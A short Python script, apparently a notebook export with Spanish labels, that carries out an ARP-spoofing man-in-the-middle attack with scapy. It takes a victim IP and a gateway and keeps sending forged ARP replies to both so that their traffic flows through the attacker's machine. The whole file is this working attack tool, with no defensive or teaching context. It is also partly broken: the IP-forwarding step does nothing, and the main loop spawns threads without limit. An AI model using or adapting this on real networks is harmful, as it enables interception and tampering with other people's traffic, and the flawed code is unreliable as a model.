#!/usr/bin/env python
# coding: utf-8

# In[3]:


import scapy.all as scapy
import subprocess
import time

import threading

global tiempoej
global myStart
global sent_packets_count
class MiHilo(threading.Thread):
    def run(self):
        global tiempoej
        global myStart
        global sent_packets_count
        contador = 1
        while tiempoej <= timefin:
            print("1 Victima "+str(victima)+" Hacker "+str(gateway))
            self.spoof(victima, gateway)
            print("2 Hacker "+str(gateway)+" Victima "+str(victima))
            self.spoof(gateway, victima)
            tiempoej = time.time() - myStart
            print("total time taken this loop: "+str(tiempoej)+ " Inicio: "+str(myStart)+" Actual: "+str(time.time()))
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets Sent: "+str(sent_packets_count))
            time.sleep(2)
            
    def mac(self,ip):
        arp_request = scapy.ARP(pdst = ip)
        broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
        return answered_list[0][1].hwsrc
  
    def spoof(self,target_ip, spoof_ip):
        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = self.mac(target_ip), psrc = spoof_ip)
        subprocess.check_output(["echo"," 1 > /proc/sys/net/ipv4/ip_forward"])
        print(packet.show()) 
        scapy.send(packet)  
        
sent_packets_count = 0
print("Ip de la victima")
victima = input ()
print("Geteway")
gateway = input ()
print("Tiempo ejecución")
timec = input ()
timefin = float(timec) * 60
tiempoej = 0
myStart = time.time()
while tiempoej <= timefin:
    hilo = MiHilo()
    hilo.start()


# In[ ]:




